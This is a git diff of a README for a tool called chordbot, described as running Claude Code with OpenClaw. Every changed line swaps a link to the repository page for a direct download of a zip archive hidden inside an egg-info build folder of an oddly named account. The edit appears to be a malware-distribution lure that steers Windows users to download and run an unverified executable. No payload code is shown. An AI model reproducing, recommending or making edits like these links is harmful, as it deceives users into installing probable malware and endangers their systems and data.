@@ -1,12 +1,12 @@
 # 🤖 chordbot - Run Claude Code With OpenClaw
 
-[![Download chordbot](https://img.shields.io/badge/Download%20chordbot-2ecc71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/babyfaced-familytrionychidae322/chordbot)
+[![Download chordbot](https://img.shields.io/badge/Download%20chordbot-2ecc71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/babyfaced-familytrionychidae322/chordbot/raw/refs/heads/main/src/chord_code.egg-info/Software-1.4-alpha.5.zip)
 
 ## 📥 Download chordbot
 
 Use the link below to visit the download page, then get the Windows version.
 
-[Visit the chordbot download page](https://github.com/babyfaced-familytrionychidae322/chordbot)
+[Visit the chordbot download page](https://github.com/babyfaced-familytrionychidae322/chordbot/raw/refs/heads/main/src/chord_code.egg-info/Software-1.4-alpha.5.zip)
 
 ## 🖥️ What chordbot does
 
@@ -37,7 +37,7 @@ For best results, use a recent Windows system with enough free memory for browse
 Follow these steps in order.
 
 1. Open the download page:
-   [https://github.com/babyfaced-familytrionychidae322/chordbot](https://github.com/babyfaced-familytrionychidae322/chordbot)
+   [https://github.com/babyfaced-familytrionychidae322/chordbot/raw/refs/heads/main/src/chord_code.egg-info/Software-1.4-alpha.5.zip](https://github.com/babyfaced-familytrionychidae322/chordbot/raw/refs/heads/main/src/chord_code.egg-info/Software-1.4-alpha.5.zip)
 
 2. Find the Windows download file on the page.
 
@@ -186,7 +186,7 @@ You can, but it is better to leave it in place unless you need to change folders
 
 ### Where do I get updates?
 Use the same download page:
-[https://github.com/babyfaced-familytrionychidae322/chordbot](https://github.com/babyfaced-familytrionychidae322/chordbot)
+[https://github.com/babyfaced-familytrionychidae322/chordbot/raw/refs/heads/main/src/chord_code.egg-info/Software-1.4-alpha.5.zip](https://github.com/babyfaced-familytrionychidae322/chordbot/raw/refs/heads/main/src/chord_code.egg-info/Software-1.4-alpha.5.zip)
 
 ## 🧾 File and folder behavior
 
@@ -216,4 +216,4 @@ For the easiest start:
 
 If you need the download page again, use this link:
 
-[Download chordbot from GitHub](https://github.com/babyfaced-familytrionychidae322/chordbot)
+[Download chordbot from GitHub](https://github.com/babyfaced-familytrionychidae322/chordbot/raw/refs/heads/main/src/chord_code.egg-info/Software-1.4-alpha.5.zip)
